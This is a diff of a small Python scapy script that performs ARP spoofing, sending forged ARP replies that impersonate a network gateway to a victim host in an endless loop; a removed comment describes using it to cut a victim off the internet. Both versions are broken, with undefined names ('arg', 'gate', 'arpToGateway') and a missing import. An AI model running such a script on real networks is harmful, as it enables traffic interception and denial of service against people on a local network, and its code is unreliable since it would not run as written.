@@ -1,19 +1,10 @@
-from scapy.all import *
-import time
 import sys
-
-#gate is gateways ip argv[1]
-#victim is victims ip argv[2]
-#use sendp
-#mac = your mac argv[3]
-cmdargs = str(sys.argv)
-op = 1
-#good way to deny internet to victim is removing time.sleep(x) and sending arpToVictim
-#This only works on some routers, usually just denies 
-arpToVictim = ARP(op=op,psrc=sys.argv[1],pdst=sys.argv[2],hwdst=sys.argv[3])
-arpGateway = ARP(op=op,pdst=sys.argv[1],psrc=sys.argv[2],hwdst=sys.argv[3])
-
+import time
+op=2
+victim= arg[1]   #'xx.xx.xx.xxx' #victim ip
+gateIp=arg[2]   #xx.xx.xx.xxx' #gatewayIP
+mac= arg[3] #xx:xx:xx:xx:xx:xx:xx'
+arp=ARP(op=op,psrc=gate,pdst=victim,hwsrc=mac)
 while 1:
-	send (arpToVictim)
-	send(arpToGateway)
-	time.sleep(5)
+	send(arp)
+	time.sleep(2)
